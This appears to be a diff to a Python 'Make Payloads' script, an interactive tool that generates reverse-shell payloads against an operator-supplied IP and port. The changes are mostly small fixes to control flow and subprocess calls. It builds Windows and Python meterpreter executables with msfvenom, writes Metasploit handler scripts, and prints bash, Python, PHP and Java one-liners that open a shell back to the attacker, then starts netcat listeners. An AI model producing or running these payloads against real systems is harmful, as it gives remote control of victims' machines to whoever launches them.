@@ -1,7 +1,7 @@
 import os
 import subprocess
 import pyfiglet
-
+import time
 os.system("clear")
 ascii_banner = pyfiglet.figlet_format("Make Payloads")
 print(ascii_banner)
@@ -15,13 +15,17 @@ def Windows_Reverse_Shell():
     ipaddr = input("[-] Enter Your Ip : ")
     port = input("[+] Enter Your Port : ")
     subprocess.call(
-        f"msfvenom -p windows/x64/meterpreter/reverse_tcp  LHOST={ipaddr} LPORT={port} -b \"\x00\" -f exe -o payload.exe", shell=True)
+        f"""msfvenom -p windows/x64/meterpreter/reverse_tcp  LHOST={ipaddr} LPORT={port} -f exe -o payload.exe""", shell=True)
     x = input("""
 We Make Payload Sucss 
 
 Do You Want To Start Listener? y/n : """)
     if x == "y":
-        os.remove("msf.rc")
+        try:
+            os.remove("msf.rc")
+        except:
+            pass
+        subprocess.call("touch msf.rc", shell=True)
         file = open("msf.rc", "a")
         file.write(f"""
 use exploit/multi/handler
@@ -31,9 +35,10 @@ set LPORT {port}
 exploit -j
         """)
         file.close()
-        subprocess.call("msfconsole -r msf.rc")
+        # time.sleep(2)
+        subprocess.call("msfconsole -r msf.rc", shell=True)
     else:
-        exit()
+        main()
 
 
 def Python_Reverse_Shell_msf():
@@ -44,13 +49,17 @@ def Python_Reverse_Shell_msf():
     ipaddr = input("[-] Enter Your Ip : ")
     port = input("[+] Enter Your Port : ")
     subprocess.call(
-        f"msfvenom -p python/meterpreter/reverse_tcp  LHOST={ipaddr} LPORT={port} -b \"\x00\" -f py -o payload.py", shell=True)
+        f"""msfvenom -p python/meterpreter/reverse_tcp  LHOST={ipaddr} LPORT={port} -f py -o payload.py""", shell=True)
     x = input("""
 We Make Payload Sucss 
 
 Do You Want To Start Listener? y/n : """)
     if x == "y":
-        os.remove("msf.rc")
+        try:
+            os.remove("msf.rc")
+        except:
+            pass
+        subprocess.call("touch msf.rc", shell=True)
         file = open("msf.rc", "a")
         file.write(f"""
 use exploit/multi/handler
@@ -60,9 +69,10 @@ set LPORT {port}
 exploit -j
         """)
         file.close()
-        subprocess.call("msfconsole -r msf.rc")
+        # time.sleep(2)
+        subprocess.call("msfconsole -r msf.rc", shell=True)
     else:
-        exit()
+        main()
 
 
 def Python3_Reverse_Shell():
@@ -82,7 +92,7 @@ python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREA
         subprocess.call(f"nc -lvnp {port}", shell=True)
 
     else:
-        exit()
+        main()
 
 
 def php_reverse_shell():
@@ -102,7 +112,7 @@ php -r '$sock=fsockopen("{ipaddr}",{port});$proc=proc_open("/bin/sh -i", array(0
         subprocess.call(f"nc -lvnp {port}", shell=True)
 
     else:
-        exit()
+        main()
 
 
 def bash_reverse_shell():
@@ -122,7 +132,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ipaddr} {port} >/tmp/f
         subprocess.call(f"nc -lvnp {port}", shell=True)
 
     else:
-        exit()
+        main()
 
 
 def powershell_reverse_shell():
@@ -141,7 +151,7 @@ def powershell_reverse_shell():
         subprocess.call(f"nc -lvnp {port}", shell=True)
 
     else:
-        exit()
+        main()
 
 
 def rubby_reverse_shell():
@@ -160,7 +170,7 @@ def rubby_reverse_shell():
         subprocess.call(f"nc -lvnp {port}", shell=True)
 
     else:
-        exit()
+        main()
 
 
 def java_reverse_shell():
@@ -179,7 +189,7 @@ Process p = r.exec("/bin/bash -c 'exec 5<>/dev/tcp/{ipaddr}/{port};cat <&5 | whi
         subprocess.call(f"nc -lvnp {port}", shell=True)
 
     else:
-        exit()
+        main()
 
 
 def golang_reverse_shell():
@@ -197,7 +207,7 @@ def golang_reverse_shell():
         subprocess.call(f"nc -lvnp {port}", shell=True)
 
     else:
-        exit()
+        main()
 
 
 def ncat_reverse_shell():
@@ -220,7 +230,7 @@ For Windows:
         subprocess.call(f"nc -lvnp {port}", shell=True)
 
     else:
-        exit()
+        main()
 
 
 def linux_reverse_tcp():
@@ -247,12 +257,13 @@ set LPORT {port}
 exploit -j
         """)
         file.close()
-        subprocess.call("msfconsole -r msf.rc")
+        subprocess.call("msfconsole -r msf.rc", shell=True)
     else:
-        exit()
+        main()
 
 
 def main():
+    os.system("clear")
     payload_num = int(input("""
 
 [1] Windows Reverse Shell Payload x64 (metasploit)
